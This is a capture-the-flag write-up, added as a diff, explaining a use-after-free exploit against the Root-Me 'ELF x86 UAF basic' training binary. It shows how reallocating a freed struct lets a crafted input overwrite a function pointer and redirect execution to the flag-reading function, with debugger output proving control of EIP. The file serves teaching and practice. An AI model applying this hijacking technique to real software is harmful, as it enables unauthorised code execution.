@@ -1,0 +1,242 @@
+root-me: elf x86 UAF basic
+
+==============================================================================
+Vulnerability
+==============================================================================
+Use After Free - Dangling Pointer: Referencing memory after it has been freed.
+                 If there is executable code within freed memory, you can call
+                 it.
+
+
+# We use this one
+void death(struct Dog* dog){
+    printf("%s run under a car... %s 0-1 car\n", dog->name, dog->name);
+    free(dog);
+}
+
+
+# We don't use this one.
+void destruct(struct DogHouse* dogHouse){
+    if(dogHouse){
+        puts("You break the dog house.");
+        free(dogHouse);
+    }
+    else
+        puts("You do not have a dog house.");
+}
+
+# Them menu
+
+1: Buy a dog
+2: Make him bark
+3: Bring me the flag
+4: Watch his death
+5: Build dog house
+6: Give dog house to your dog
+7: Break dog house
+0: Quit
+
+
+1. We buy a dog.
+
+case '1':
+            puts("How do you name him?");
+            fgets(line, BUFLEN, stdin);
+            eraseNl(line);
+            dog = newDog(line);
+            break;
+
+# Notice eraseNl(line). Let's see what this function does.
+
+int eraseNl(char* line){
+    for(;*line != '\n'; line++);
+    *line = 0;
+    return 0;
+}
+
+# For anything that's NOT equal to '\n', keep it.
+# Allocate memory; size of the struct Dog.
+# strncpy(dog->name, name, 12);
+# Here is a snip for strncpy Man page:
+
+[...]
+Warning:  If there is no null byte among the first n bytes of src, 
+the string placed in dest will not be null-terminated.
+
+If  the  length of src is less than n, strncpy() writes additional null
+bytes to dest to ensure that a total of n bytes are written.
+[...]
+
+# Now since eraseNl(line) removes the NULL byte. We can enter 64 bytes
+  since BUFLEN is 64
+  
+fgets(line, BUFLEN, stdin); 
+
+struct Dog* newDog(char* name){
+    printf("You buy a new dog. %s is a good name for him\n", name);
+    struct Dog* dog = malloc(sizeof(struct Dog));
+    strncpy(dog->name, name, 12);
+    dog->bark = bark;
+    dog->bringBackTheFlag = bringBackTheFlag;
+    dog->death = death;
+    return dog;
+}
+
+
+2. Watch his death.
+
+# We now free up the memory we allocated for struct Dog and have a
+  dangling pointer.
+
+
+void death(struct Dog* dog){
+    printf("%s run under a car... %s 0-1 car\n", dog->name, dog->name);
+    free(dog);
+}
+
+3. We build a dog house.
+
+# The memory we allocate for newDogHouse() is at the dangling pointer:
+
+struct DogHouse* dogHouse = malloc(sizeof(struct DogHouse))
+
+puts("Where do you build it?");
+    fgets(line, BUFLEN, stdin);
+    eraseNl(line);
+    strncpy(dogHouse->address, line, 16);
+   
+    puts("How do you name it?");
+    fgets(line, 64, stdin);
+    eraseNl(line);
+    strncpy(dogHouse->name, line, 8);
+   
+    puts("You build a new dog house.");
+
+
+# We can first enter 16 bytes. We know that eraseNl(line) will kill off the
+  NULL byte and strncpy will keep copying without a NULL byte to stop it.
+
+
+# 12 bytes will take up name[12] in struct Dog.
+# Then the 4 remaining bytes will overwrite void (*bark)();
+# A pointer to a function.
+
+struct Dog {
+    char name[12];  <-- 12 bytes with strncpy(dogHouse->address, line, 16);
+    void (*bark)(); <-- 04 bytes, EIP overwritten. If called will crash.
+    void (*bringBackTheFlag)();
+    void (*death)(struct Dog*);
+};
+
+
+==============================================================================
+Exploit
+==============================================================================
+
+2. Make him bark.
+
+# Now that we've overwritten a pointer to the bark function, we have to call
+  it.
+
+case '2':
+            if(!dog){
+                puts("You do not have a dog.");
+                break;
+            }
+            dog->bark();
+            break;
+
+
+# dog->bark(); 
+# this means we are going inside struct Dog to call void (*bark)();
+# Which is overwritten with our 4 bytes.
+
+
+EIP Overwrite
+
+You build a new dog house.
+1: Buy a dog
+2: Make him bark
+3: Bring me the flag
+4: Watch his death
+5: Build dog house
+6: Give dog house to your dog
+7: Break dog house
+0: Quit
+3
+Bring me the flag 222222222222BBBB3333!!!
+222222222222BBBB3333 prefers to bark...
+
+Program received signal SIGSEGV, Segmentation fault.
+0x42424242 in ?? ()
+
+
+
+# From here place the address of the winning function():
+
+void bringBackTheFlag(){
+    char flag[32];
+    FILE* flagFile = fopen(".passwd","r");
+    if(flagFile == NULL)
+    {
+        puts("fopen error");
+        exit(1);
+    }
+    fread(flag, 1, 32, flagFile);
+    flag[20] = 0;
+    fclose(flagFile);
+    puts(flag);
+}
+
+
+
+# For local box it took around 25-300 with ASLR. Guessing 2 bytes.
+# Root-me box had its address static with ASLR on. 1st try.
+
+
+Breakpoint 2, 0x5655678d in main ()
+0x5655a9a8:	0x00000000	0x00000000	0x00000000	0x00000000
+0x5655a9b8:	0x00000000	0x00000021	0x32323232	0x32323232
+0x5655a9c8:	0x32323232	0x42424242	0x33333333	0x00000000
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+─────────────────────────────────[ REGISTERS ]─────────────────────────────────
+ EAX  0x42424242 ('BBBB')
+ EBX  0x56558fa4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x3eac
+ ECX  0xffffffff
+ EDX  0xffffffff
+ EDI  0xf7fa1000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1dfd6c
+ ESI  0xf7fa1000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1dfd6c
+ EBP  0xffffd208 ◂— 0x0
+ ESP  0xffffd1b0 ◂— 0x41410000
+ EIP  0x5655678d (main+426) ◂— call   eax
+──────────────────────────────────[ DISASM ]───────────────────────────────────
+ ► 0x5655678d <main+426>    call   eax
+ 
+   0x5655678f <main+428>    jmp    main+713 <0x565568ac>
+ 
+   0x56556794 <main+433>    cmp    dword ptr [ebp - 0x10], 0
+   0x56556798 <main+437>    jne    main+462 <0x565567b1>
+ 
+   0x5655679a <main+439>    sub    esp, 0xc
+   0x5655679d <main+442>    lea    eax, [ebx - 0x1df5]
+   0x565567a3 <main+448>    push   eax
+   0x565567a4 <main+449>    call   puts@plt <0x565560b0>
+ 
+   0x565567a9 <main+454>    add    esp, 0x10
+   0x565567ac <main+457>    jmp    main+713 <0x565568ac>
+ 
+   0x565567b1 <main+462>    mov    eax, dword ptr [ebp - 0x10]
+───────────────────────────────────[ STACK ]───────────────────────────────────
+00:0000│ esp  0xffffd1b0 ◂— 0x41410000
+01:0004│      0xffffd1b4 ◂— 0x4141 /* 'AA' */
+02:0008│      0xffffd1b8 ◂— 0x0
+... ↓
+─────────────────────────────────[ BACKTRACE ]─────────────────────────────────
+ ► f 0 5655678d main+426
+   f 1 f7ddfef1 __libc_start_main+241
+Breakpoint *main+426
+
+
+==============================================================================
+Summary
+==============================================================================
